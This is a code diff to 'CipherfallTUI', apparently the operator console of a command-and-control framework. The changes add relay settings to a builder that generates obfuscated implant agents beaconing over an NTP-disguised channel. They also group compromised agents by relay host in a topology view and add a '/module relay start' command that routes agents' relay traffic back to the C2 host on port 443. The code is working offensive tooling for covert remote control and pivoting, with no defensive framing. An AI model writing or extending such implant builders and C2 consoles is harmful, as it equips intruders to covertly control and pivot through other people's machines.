@@ -98,11 +98,22 @@ def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
 
 
 def _bake_agent_ntp(psk: str, interval: int, jitter: int,
-                    out_name: str) -> pathlib.Path:
+                    out_name: str, tcp_port: int = 443,
+                    relay_host: str = "") -> pathlib.Path:
     ntp_agent = HERE / "ntp" / "clockvenom.py"
     if not ntp_agent.exists():
         raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
     src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
+    src = re.sub(
+        r'TCP_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+        f'TCP_PORT         = int(os.environ.get("C2_TCP_PORT", "{tcp_port}"))',
+        src,
+    )
+    src = re.sub(
+        r'C2_DIRECT\s*=\s*os\.environ\.get\([^)]+\)',
+        f'C2_DIRECT        = os.environ.get("C2_DIRECT", "{relay_host}")',
+        src,
+    )
     out = HERE / out_name
     out.write_text(src, encoding="utf-8")
     return out
@@ -133,6 +144,13 @@ def _agent_line(t: Text, a: dict, info: dict, *, tag: str = "",
     t.append(f"  {_ago(a['last_seen'])}", style="dim")
 
 
+def _url_host(url: str) -> str:
+    try:
+        return url.split("://", 1)[1].rsplit(":", 1)[0]
+    except Exception:
+        return ""
+
+
 def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = "127.0.0.1") -> Text:
     now  = int(time.time())
     wurl = worker_url.rstrip("/")
@@ -140,8 +158,8 @@ def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = 
 
     dead: list  = []
     layer1: list = []        # (agent, info, children_list)
-    relay_by_port: dict = {} # port -> layer1 index
-    orphans: list = []       # isolated agents, matched later
+    relay_by_host: dict = {} # relay_host IP -> layer1 index
+    orphans: list = []
 
     for a in agents:
         info = json.loads(a.get("sysinfo") or "{}")
@@ -149,23 +167,23 @@ def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = 
         if now - a["last_seen"] > bi * 5:
             dead.append((a, info))
             continue
-        rport = info.get("relay_port", 0)
-        awurl = info.get("worker_url", "").rstrip("/")
+        rport  = info.get("relay_port", 0)
+        rhost  = info.get("relay_host", "")
+        awurl  = info.get("worker_url", "").rstrip("/")
+        ahost  = _url_host(awurl)
         if rport > 0:
             idx = len(layer1)
             layer1.append((a, info, []))
-            relay_by_port[rport] = idx
-        elif awurl and awurl != wurl:
-            orphans.append((a, info, awurl))
-        else:
+            if rhost:
+                relay_by_host[rhost] = idx
+        elif awurl == wurl or ahost == c2_host or not awurl:
             layer1.append((a, info, []))
+        else:
+            orphans.append((a, info, awurl))
 
     for a, info, awurl in orphans:
-        try:
-            port = int(awurl.rstrip("/").rsplit(":", 1)[-1])
-        except Exception:
-            port = -1
-        idx = relay_by_port.get(port)
+        ahost = _url_host(awurl)
+        idx   = relay_by_host.get(ahost)
         if idx is not None:
             layer1[idx][2].append((a, info, awurl))
         else:
@@ -306,6 +324,8 @@ class CipherfallTUI(App):
 
     _selected_agent: str | None = None
     _selected_task:  str | None = None
+    _cmd_history: list[str] = []
+    _history_idx: int = -1
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -355,6 +375,15 @@ class CipherfallTUI(App):
                         with Horizontal(classes="form-row"):
                             yield Label("JITTER (s)", classes="form-label")
                             yield Input(id="p-jitter", value="10")
+                        with Horizontal(classes="form-row", id="row-relay"):
+                            yield Label("VIA RELAY", classes="form-label")
+                            yield Switch(id="p-relay", value=False)
+                        with Horizontal(classes="form-row", id="row-relay-host"):
+                            yield Label("RELAY HOST", classes="form-label")
+                            yield Input(id="p-relay-host", placeholder="192.168.x.x")
+                        with Horizontal(classes="form-row", id="row-relay-port"):
+                            yield Label("RELAY PORT", classes="form-label")
+                            yield Input(id="p-relay-port", value="123")
                         with Horizontal(classes="form-row"):
                             yield Label("OBFUSCATION", classes="form-label")
                             yield Switch(id="p-obf", value=True)
@@ -375,6 +404,10 @@ class CipherfallTUI(App):
         self.query_one("#tasks-table", DataTable).add_columns(
             "ID", "Command", "Status", "Time"
         )
+        # relay rows only relevant for NTP; default agent type is cloudflare
+        self.query_one("#row-relay").display      = False
+        self.query_one("#row-relay-host").display = False
+        self.query_one("#row-relay-port").display = False
         await self._load_agents()
         self.set_interval(5.0, self._load_agents)
 
@@ -473,6 +506,28 @@ class CipherfallTUI(App):
             self._selected_task = str(event.row_key.value)
             await self._show_output(self._selected_task)
 
+    def on_key(self, event) -> None:
+        focused = self.focused
+        if not (focused and getattr(focused, "id", None) == "cmd-input"):
+            return
+        inp = self.query_one("#cmd-input", Input)
+        if event.key == "up":
+            if not self._cmd_history:
+                return
+            self._history_idx = min(self._history_idx + 1, len(self._cmd_history) - 1)
+            inp.value = self._cmd_history[self._history_idx]
+            inp.cursor_position = len(inp.value)
+            event.prevent_default()
+        elif event.key == "down":
+            if self._history_idx <= 0:
+                self._history_idx = -1
+                inp.value = ""
+                return
+            self._history_idx -= 1
+            inp.value = self._cmd_history[self._history_idx]
+            inp.cursor_position = len(inp.value)
+            event.prevent_default()
+
     async def on_input_submitted(self, event: Input.Submitted) -> None:
         if event.input.id != "cmd-input":
             return
@@ -480,6 +535,19 @@ class CipherfallTUI(App):
         if not cmd or not self._selected_agent:
             return
         event.input.value = ""
+        if not self._cmd_history or self._cmd_history[0] != cmd:
+            self._cmd_history.insert(0, cmd)
+            if len(self._cmd_history) > 100:
+                self._cmd_history.pop()
+        self._history_idx = -1
+        if cmd.startswith("/module relay"):
+            parts = cmd.split()
+            # /module relay [start [port [target]]]
+            if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
+                port = "123"
+                cmd  = f"/module relay start {port} {_C2_HOST}:443"
+            elif len(parts) == 4 and parts[2] == "start":
+                cmd  = f"/module relay start {parts[3]} {_C2_HOST}:443"
         try:
             async with httpx.AsyncClient() as c:
                 r = await c.post(
@@ -502,6 +570,16 @@ class CipherfallTUI(App):
             return
         is_cf = event.value == "cloudflare"
         self.query_one("#row-url").display = is_cf
+        is_relay_on = self.query_one("#p-relay", Switch).value
+        self.query_one("#row-relay").display      = not is_cf
+        self.query_one("#row-relay-host").display = not is_cf and is_relay_on
+        self.query_one("#row-relay-port").display = not is_cf and is_relay_on
+
+    def on_switch_changed(self, event: Switch.Changed) -> None:
+        if event.switch.id != "p-relay":
+            return
+        self.query_one("#row-relay-host").display = event.value
+        self.query_one("#row-relay-port").display = event.value
 
     async def on_button_pressed(self, event: Button.Pressed) -> None:
         if event.button.id != "btn-generate":
@@ -510,18 +588,23 @@ class CipherfallTUI(App):
         status = self.query_one("#payload-status", Static)
         status.update("[yellow]generating…[/yellow]")
 
-        agent_type = self.query_one("#p-type",   Select).value
-        worker_url = self.query_one("#p-url",    Input).value.strip().rstrip("/")
-        psk        = self.query_one("#p-psk",    Input).value.strip()
-        interval   = int(self.query_one("#p-int",    Input).value.strip() or "30")
-        jitter     = int(self.query_one("#p-jitter", Input).value.strip() or "10")
-        obfuscate  = self.query_one("#p-obf",    Switch).value
-        out_name   = self.query_one("#p-out",    Input).value.strip() or "agent_payload.py"
+        agent_type  = self.query_one("#p-type",       Select).value
+        worker_url  = self.query_one("#p-url",        Input).value.strip().rstrip("/")
+        psk         = self.query_one("#p-psk",        Input).value.strip()
+        interval    = int(self.query_one("#p-int",    Input).value.strip() or "30")
+        jitter      = int(self.query_one("#p-jitter", Input).value.strip() or "10")
+        relay_mode  = self.query_one("#p-relay",       Switch).value
+        relay_host  = self.query_one("#p-relay-host", Input).value.strip()
+        relay_port  = int(self.query_one("#p-relay-port", Input).value.strip() or "8443")
+        obfuscate   = self.query_one("#p-obf",        Switch).value
+        out_name    = self.query_one("#p-out",        Input).value.strip() or "agent_payload.py"
 
         try:
             if agent_type == "ntp":
+                tcp_port = relay_port if relay_mode else 443
+                host     = relay_host if relay_mode else ""
                 out = await asyncio.to_thread(
-                    _bake_agent_ntp, psk, interval, jitter, out_name
+                    _bake_agent_ntp, psk, interval, jitter, out_name, tcp_port, host
                 )
             else:
                 out = await asyncio.to_thread(
@@ -529,7 +612,8 @@ class CipherfallTUI(App):
                 )
             if obfuscate:
                 out = await asyncio.to_thread(_obfuscate, out)
-            status.update(f"[green]✓  {agent_type} agent → {out.name}[/green]")
+            relay_tag = f" [via {relay_host}:{relay_port}]" if (agent_type == "ntp" and relay_mode) else ""
+            status.update(f"[green]✓  {agent_type} agent{relay_tag} → {out.name}[/green]")
         except Exception as e:
             status.update(f"[red]error: {e}[/red]")
 
